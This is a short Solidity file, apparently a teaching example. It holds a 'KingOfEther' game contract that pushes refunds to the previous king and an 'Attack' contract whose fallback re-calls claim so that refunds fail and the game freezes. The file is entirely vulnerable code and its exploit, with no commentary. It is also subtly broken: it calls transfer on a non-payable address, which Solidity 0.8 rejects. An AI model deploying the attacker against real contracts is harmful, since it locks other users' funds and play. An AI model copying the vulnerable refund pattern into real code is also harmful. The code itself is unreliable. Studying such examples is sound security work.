pragma solidity ^0.8.13;

contract  KingOfEther{
   address public king;
   uint public balance;

   function claim() public payable {
       require(msg.value > balance);
       king.transfer(balance);
       king = msg.sender;
       balance = msg.value;
   }
}

contract Attack {
      KingOfEther kingOfEther;
      constructor(address _kingOfEther) {
         kingOfEther = KingOfEther(_kingOfEther);
      }
      function attack() public payable {
         kingOfEther.claim{value: msg.value}();
      }
      fallback() external payable {
         kingOfEther.claim{value: msg.value}();
      }
}